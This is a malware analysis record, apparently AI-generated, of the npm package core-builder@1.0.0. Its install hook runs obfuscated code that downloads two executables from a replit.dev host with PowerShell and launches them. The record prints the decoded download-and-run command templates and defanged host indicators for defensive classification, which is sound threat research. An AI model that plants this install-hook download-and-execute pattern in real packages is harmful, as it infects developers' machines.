# npm core-builder@1.0.0

**Source:** datadog · **Source label:** malicious · **Released:** 2024-12-03 (registry) · **Assessment:** malicious (high) · **Analysis:** ai (claude-opus-5-5)

## Summary

The `postinstall` hook runs `node index.js`, a single-line obfuscator.io script. After decoding its string table, it loops over two URLs on one replit.dev host (paths `/ps` and `/sk`). For each one it runs `powershell -Command "Invoke-WebRequest -Uri '<url>' -OutFile '<__dirname>/json.exe|loser.exe'"`, then `powershell -Command "Start-Process '<file>'"`. There are no gates: nothing checks the OS or anything else in the environment, so the payload runs on every install. It only works on Windows with PowerShell and network access to the host.

## Execution

- **postinstall** `node index.js`: runs index.js; direct_script, inline_shell, download_then_exec, detached_child.

## Gates

None.

## Requirements

- os: win32 (payload runs powershell and launches downloaded .exe files; no OS check, it just fails elsewhere)
- installed_tool: powershell (both download (Invoke-WebRequest) and launch (Start-Process) go through powershell -Command via child_process.exec)
- network: ebdfa635-60a4-499e-9da8-2b609eb309c3-00-3k30gj5i2z09x[.]riker[.]replit[.]dev:443 (second-stage executables are fetched over https from this host)

## Behaviour

- Ungated: download, write_file, exec_downloaded
- Gated: none

## Notes

- prepare.py did not recover the string table, so I decoded it by hand: rotation 3, offset 0x1db, and the checksum matched (578503). No decoder module was registered because no recorded condition depends on the decode.
- The tool's endpoint hint was truncated to `hxxps://eb`. I replaced it with the two full defanged URLs.
- Off Windows, the exec rejects and the unhandled rejection ends the script, so there is no silent failure. The started executables keep running after powershell returns (`detached_child`).

## Record

```json
{
  "schema_version": "3.2",
  "record_type": "analysed",
  "package": {
    "ecosystem": "npm",
    "name": "core-builder",
    "version": "1.0.0",
    "archive_sha256": "137179dfd56d6d588329ee20e37e25100305e36b2d89ef004bc5f2d9b1e12eef",
    "source_dataset": "datadog",
    "source_label": "malicious",
    "released_at": "2024-12-03",
    "released_at_source": "registry",
    "sample_path": "datadog/npm/malicious_intent/2024-12-04-core-builder-v1.0.0.zip",
    "package_root": "layer0/tmp/tmpsrhut4ex/core-builder/package",
    "cluster_key": "3cb445895ccbd3e3f3f23bfbfcf0386c0815d116a830a16f16f723542e96c9eb",
    "analysis_type": "ai",
    "model_name": "claude-opus-5-5"
  },
  "execution": {
    "entry_points": [
      {
        "hook": "postinstall",
        "command": "node index.js",
        "runs_on": "always",
        "file_chain": [
          "index.js"
        ],
        "interpreter": "node",
        "launch_style": [
          "direct_script",
          "inline_shell",
          "download_then_exec",
          "detached_child"
        ],
        "silent_failure": false
      }
    ],
    "delays": [],
    "notes": [
      "index.js: one-line obfuscator.io output (41-entry string table, rotation 3, offset 0x1db). prepare.py did not recover it; decoded by hand, rotation checksum 578503 matched the target. Whole file read in full after decode; nothing unread.",
      "Decoded flow: for two URLs (.../ps and .../sk on one replit.dev host) run powershell Invoke-WebRequest -OutFile to __dirname/json.exe and __dirname/loser.exe, then powershell Start-Process on each file.",
      "No environment checks anywhere: no platform test before calling powershell. The loop is a fixed 2-iteration for over the urls array, not a gate. No decoder registered since no condition depends on the decode.",
      "Errors are not swallowed: a failing exec (no powershell on Linux/macOS) rejects the async IIFE with no handler, so node exits with an unhandled rejection."
    ]
  },
  "requirements": [
    {
      "axis": "os",
      "value": "win32",
      "reason": "payload runs powershell and launches downloaded .exe files; no OS check, it just fails elsewhere"
    },
    {
      "axis": "installed_tool",
      "value": "powershell",
      "reason": "both download (Invoke-WebRequest) and launch (Start-Process) go through powershell -Command via child_process.exec"
    },
    {
      "axis": "network",
      "value": "ebdfa635-60a4-499e-9da8-2b609eb309c3-00-3k30gj5i2z09x[.]riker[.]replit[.]dev:443",
      "reason": "second-stage executables are fetched over https from this host"
    }
  ],
  "conditions": [],
  "gates": [],
  "behaviours": {
    "ungated": [
      "download",
      "write_file",
      "exec_downloaded"
    ],
    "gated": []
  },
  "obfuscation": {
    "level": "moderate",
    "techniques": [
      "obfuscator.io string table with rotation IIFE and offset decoder",
      "hex identifiers",
      "strings split into fragments and concatenated (URLs, module names, powershell commands)",
      "arithmetic-expression constants",
      "proxy-object wrappers for calls and comparisons",
      "single very long line"
    ],
    "decoded": true,
    "unrecovered": []
  },
  "reachability": {
    "needs_remote": true,
    "endpoints": [
      {
        "indicator": "hxxps://ebdfa635-60a4-499e-9da8-2b609eb309c3-00-3k30gj5i2z09x.riker.replit[.]dev/ps",
        "role": "second_stage"
      },
      {
        "indicator": "hxxps://ebdfa635-60a4-499e-9da8-2b609eb309c3-00-3k30gj5i2z09x.riker.replit[.]dev/sk",
        "role": "second_stage"
      }
    ]
  },
  "attack_type": "malicious_new_package",
  "family_hint": null,
  "claude_assessment": "malicious",
  "assessment_reason": "The postinstall hook runs obfuscated code that downloads two executables from a replit.dev host via PowerShell into the package folder and starts them with Start-Process. There is no gate; it runs on every install and simply fails off Windows.",
  "label_disagreement": false,
  "confidence": "high",
  "needs_manual_review": false,
  "review_reasons": [],
  "normalisation": {
    "derivations": [],
    "candidate_set": {
      "generator": "gate_extract@88c7907d65",
      "sha256": "428960f5b8cf6c20"
    },
    "units_summary": [],
    "truncation": {
      "walk_limit": false,
      "context_limited_files": 0
    }
  },
  "candidate_review": {
    "dropped": []
  },
  "candidate_check": {
    "condition_candidates": 0,
    "condition_sites_cited": 0,
    "guards_cited": 0,
    "candidates_dropped": 0,
    "conditions_in_set": 0,
    "conditions_out_of_set": 0,
    "guard_candidates": 0,
    "gates_in_set": 0,
    "gates_out_of_set": 0,
    "out_of_set_ids": [],
    "anchor_refusals": 0
  }
}
```
